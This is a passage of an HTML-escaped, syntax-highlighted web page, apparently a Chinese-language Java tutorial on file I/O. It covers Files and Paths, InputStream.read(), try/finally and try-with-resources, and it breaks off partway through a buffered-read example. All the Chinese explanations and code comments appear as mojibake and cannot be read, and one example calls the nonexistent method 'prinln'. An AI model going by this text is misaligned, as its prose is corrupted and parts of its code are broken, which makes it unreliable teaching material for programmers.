&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="filespaths">Files&amp;amp;Paths&lt;/h3>
&lt;p>æ˜¯&lt;code>java.nio&lt;/code>åŒ…é‡Œé¢çš„ç±»ï¼Œå°è£…äº†å¾ˆå¤šè¯»å†™æ–‡ä»¶çš„ç®€å•æ–¹æ³•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŠŠä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹è¯»å–ä¸ºä¸€ä¸ªbyte[]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readAllBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŠŠä¸€ä¸ªæ–‡ä»¶çš„å…¨éƒ¨å†…å®¹è¯»å–ä¸ºString
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// é»˜è®¤ä½¿ç”¨UTF-8ç¼–ç è¯»å–:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">content1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å¯æŒ‡å®šç¼–ç :
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">content2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ISO_8859_1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŒ‰è¡Œè¯»å–å¹¶è¿”å›æ¯è¡Œå†…å®¹:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lines&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readAllLines&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å†™å…¥æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å†™å…¥äºŒè¿›åˆ¶æ–‡ä»¶:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å†™å…¥æ–‡æœ¬å¹¶æŒ‡å®šç¼–ç :
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;æ–‡æœ¬å†…å®¹...&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ISO_8859_1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// æŒ‰è¡Œå†™å…¥æ–‡æœ¬:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lines&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">lines&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„ï¼Œ&lt;code>Files&lt;/code>æä¾›çš„è¯»å†™æ–¹æ³•ï¼Œå—å†…å­˜é™åˆ¶ï¼Œåªèƒ½è¯»å†™å°æ–‡ä»¶ï¼Œä¾‹å¦‚é…ç½®æ–‡ä»¶ç­‰ï¼Œä¸å¯ä¸€æ¬¡è¯»å…¥å‡ ä¸ªGçš„å¤§æ–‡ä»¶ã€‚è¯»å†™å¤§å‹æ–‡ä»¶ä»ç„¶è¦ä½¿ç”¨æ–‡ä»¶æµï¼Œæ¯æ¬¡åªè¯»å†™ä¸€éƒ¨åˆ†æ–‡ä»¶å†…å®¹&lt;/p>
&lt;h3 id="å­—èŠ‚æµè¯»å†™">å­—èŠ‚æµè¯»å†™&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>InputStream&lt;/code>ä»£è¡¨è¾“å…¥å­—èŠ‚æµï¼Œ&lt;code>OuputStream&lt;/code>ä»£è¡¨è¾“å‡ºå­—èŠ‚æµï¼Œä»¥byteä¸ºæœ€å°å•ä½&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Reader&lt;/code>å’Œ&lt;code>Writer&lt;/code>è¡¨ç¤ºå­—ç¬¦æµ(è¯»å†™å­—ç¬¦ï¼Œå¹¶ä¸”å­—ç¬¦ä¸å…¨æ˜¯å•å­—èŠ‚è¡¨ç¤ºçš„ASCIIå­—ç¬¦)ï¼Œä»¥charä¸ºæœ€å°å•ä½&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å¦‚æœæ•°æ®æºä¸æ˜¯æ–‡æœ¬ï¼Œå°±åªèƒ½ä½¿ç”¨&lt;code>InputStream&lt;/code>ï¼Œå¦‚æœæ•°æ®æºæ˜¯æ–‡æœ¬ï¼Œä½¿ç”¨Readeræ›´æ–¹ä¾¿ä¸€äº›&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>InputStream&lt;/code>å¹¶ä¸æ˜¯ä¸€ä¸ªæ¥å£ï¼Œè€Œæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå®ƒæ˜¯æ‰€æœ‰è¾“å…¥æµçš„è¶…ç±»ï¼Œè¿™ä¸ªæŠ½è±¡ç±»å®šä¹‰çš„ä¸€ä¸ªæœ€é‡è¦çš„æ–¹æ³•å°±æ˜¯&lt;code>int read()&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™ä¸ªæ–¹æ³•ä¼šè¯»å–è¾“å…¥æµçš„ä¸‹ä¸€ä¸ªå­—èŠ‚ï¼Œå¹¶è¿”å›å­—èŠ‚è¡¨ç¤ºçš„&lt;code>int&lt;/code>å€¼ï¼ˆ0~255ï¼‰ï¼Œå¦‚æœå·²è¯»åˆ°æœ«å°¾ï¼Œè¿”å›&lt;code>-1&lt;/code>è¡¨ç¤ºä¸èƒ½ç»§ç»­è¯»å–äº†&lt;/p>
&lt;ul>
&lt;li>&lt;code>FileInputStream&lt;/code>æ˜¯&lt;code>InputStream&lt;/code>çš„ä¸€ä¸ªå­ç±»ï¼Œä»æ–‡ä»¶æµä¸­è¯»å–æ•°æ®&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.md&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æ‰€æœ‰ä¸IOæ“ä½œç›¸å…³çš„ä»£ç éƒ½å¿…é¡»æ­£ç¡®å¤„ç†&lt;code>IOException&lt;/code>ï¼Œå¯ä»¥ç”¨&lt;code>try ... finally&lt;/code>æ¥ä¿è¯&lt;code>InputStream&lt;/code>åœ¨æ— è®ºæ˜¯å¦å‘ç”ŸIOé”™è¯¯çš„æ—¶å€™éƒ½èƒ½å¤Ÿæ­£ç¡®åœ°å…³é—­&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())!=-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">prinln&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">finally&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>java7ä¹‹åå¯ä»¥ç”¨æ›´ç®€å•çš„try(resource)&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#75715e">// ç¼–è¯‘å™¨åœ¨æ­¤è‡ªåŠ¨ä¸ºæˆ‘ä»¬å†™å…¥finallyå¹¶è°ƒç”¨close()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å®é™…ä¸Šï¼Œç¼–è¯‘å™¨å¹¶ä¸ä¼šç‰¹åˆ«åœ°ä¸º&lt;code>InputStream&lt;/code>åŠ ä¸Šè‡ªåŠ¨å…³é—­ã€‚ç¼–è¯‘å™¨åªçœ‹&lt;code>try(resource = ...)&lt;/code>ä¸­çš„å¯¹è±¡æ˜¯å¦å®ç°äº†&lt;code>java.lang.AutoCloseable&lt;/code>æ¥å£ï¼Œå¦‚æœå®ç°äº†ï¼Œå°±è‡ªåŠ¨åŠ ä¸Š&lt;code>finally&lt;/code>è¯­å¥å¹¶è°ƒç”¨&lt;code>close()&lt;/code>æ–¹æ³•ã€‚&lt;code>InputStream&lt;/code>å’Œ&lt;code>OutputStream&lt;/code>éƒ½å®ç°äº†è¿™ä¸ªæ¥å£ï¼Œå› æ­¤éƒ½å¯ä»¥ç”¨åœ¨&lt;code>try(resource)&lt;/code>ä¸­&lt;/p>
&lt;ul>
&lt;li>&lt;code>InputStream&lt;/code>æä¾›äº†ä¸¤ä¸ªé‡è½½æ–¹æ³•æ¥æ”¯æŒè¯»å–å¤šä¸ªå­—èŠ‚&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>int read(byte[] b)ï¼šè¯»å–è‹¥å¹²å­—èŠ‚å¹¶å¡«å……åˆ°byte[]æ•°ç»„ï¼Œè¿”å›è¯»å–çš„å­—èŠ‚æ•°
int read(byte[] b, int off, int len)ï¼šæŒ‡å®šbyte[]æ•°ç»„çš„åç§»é‡å’Œæœ€å¤§å¡«å……æ•°
&lt;/code>&lt;/pre>&lt;p>åˆ©ç”¨ä¸Šè¿°æ–¹æ³•ä¸€æ¬¡è¯»å–å¤šä¸ªå­—èŠ‚æ—¶ï¼Œéœ€è¦å…ˆå®šä¹‰ä¸€ä¸ª&lt;code>byte[]&lt;/code>æ•°ç»„ä½œä¸ºç¼“å†²åŒºï¼Œ&lt;code>read()&lt;/code>æ–¹æ³•ä¼šå°½å¯èƒ½å¤šåœ°è¯»å–å­—èŠ‚åˆ°ç¼“å†²åŒºï¼Œ ä½†ä¸ä¼šè¶…è¿‡ç¼“å†²åŒºçš„å¤§å°ã€‚&lt;code>read()&lt;/code>æ–¹æ³•çš„è¿”å›å€¼ä¸å†æ˜¯å­—èŠ‚çš„&lt;code>int&lt;/code>å€¼ï¼Œè€Œæ˜¯è¿”å›å®é™…è¯»å–äº†å¤šå°‘ä¸ªå­—èŠ‚ã€‚å¦‚æœè¿”å›&lt;code>-1&lt;/code>ï¼Œè¡¨ç¤ºæ²¡æœ‰æ›´å¤šçš„æ•°æ®äº†&lt;/p>
&lt;p>åˆ©ç”¨ç¼“å†²åŒºä¸€æ¬¡è¯»å–å¤šä¸ªå­—èŠ‚çš„ä»£ç å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// å®šä¹‰1000ä¸ªå­—èŠ‚å¤§å°çš„ç¼“å†²åŒº:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">1000&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
